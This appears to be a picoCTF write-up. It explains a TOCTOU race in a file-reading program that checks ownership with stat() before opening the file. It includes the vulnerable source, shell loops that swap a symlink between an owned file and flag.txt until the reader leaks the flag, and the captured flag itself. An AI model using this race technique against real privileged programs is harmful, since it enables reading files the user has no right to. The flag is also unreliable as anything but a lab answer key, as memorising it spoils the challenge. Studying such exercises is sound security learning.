we need to connect via ssh to look into the server and read flag file
    ssh ctf-player@saturn.picoctf.net -p 58521

now we have this src.cpp program in the server
    this program reads a file if the owner of the file has run this program
    in this program we first check the owner of the process running this program with the owner of the file
    to get the owner of the file we are about to read program uses stat() function
        if the program has used the lstat() function we would have been able to make a symbolic link to the file we want to read and would be able to read into
        but this program uses the stat() function which will follow the symbolic link to determine the owner of the file

this is a race condition vulnerability
    to exploit this program we can run two threads with different workllad and wish we can trigger some race condition to read the flag file
    in thread 1
        we can make a symolic link to a file we own and then force that symbolic link to point to the flag.txt file in loop
    in thread 2
        we can call the program on the symbolic link we create in thread 1 in loop
    race condition 
        if between the owner check and file read in thread 2 gets preemted by thread 1 and thread 1 changes the symbolic link from our own file to flag.txt we can read flag.txt

src.cpp
    #include <iostream>
    #include <fstream>
    #include <unistd.h>
    #include <sys/stat.h>

    int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
        return 1;
    }

    std::string filename = argv[1];
    std::ifstream file(filename);
    struct stat statbuf;

    // Check the file's status information.
    if (stat(filename.c_str(), &statbuf) == -1) {
        std::cerr << "Error: Could not retrieve file information" << std::endl;
        return 1;
    }

    // Check the file's owner.
    if (statbuf.st_uid != getuid()) {
        std::cerr << "Error: you don't own this file" << std::endl;
        return 1;
    }

    // Read the contents of the file.
    if (file.is_open()) {
        std::string line;
        while (getline(file, line)) {
        std::cout << line << std::endl;
        }
    } else {
        std::cerr << "Error: Could not open file" << std::endl;
        return 1;
    }

    return 0;
    }

the ssh cmds
    ssh ctf-player@saturn.picoctf.net -p 58521
        ls -al
        cat src.cpp
        ./txtreader flag.txt
            error you dont own this file
        timeout 30s bash -c 'while true; do ln -sf src.cpp flag; ln -sf flag.txt flag; done' &
            timeout to stop the loop in 30s
            src.cpp is the file we own 
            flag is the symbolic link we are manipulating 
            & is used to make this command run in the background
        while ! ./txtreader flag 2> /dev/null | grep "picoCTF"; do :; done
            The ! operator negates the exit status of the command that follows it. 
            The command that follows it runs ./txtreader flag and redirects any error messages to /dev/null. 


flag - picoCTF{ToctoU_!s_3a5y_a5726c65}



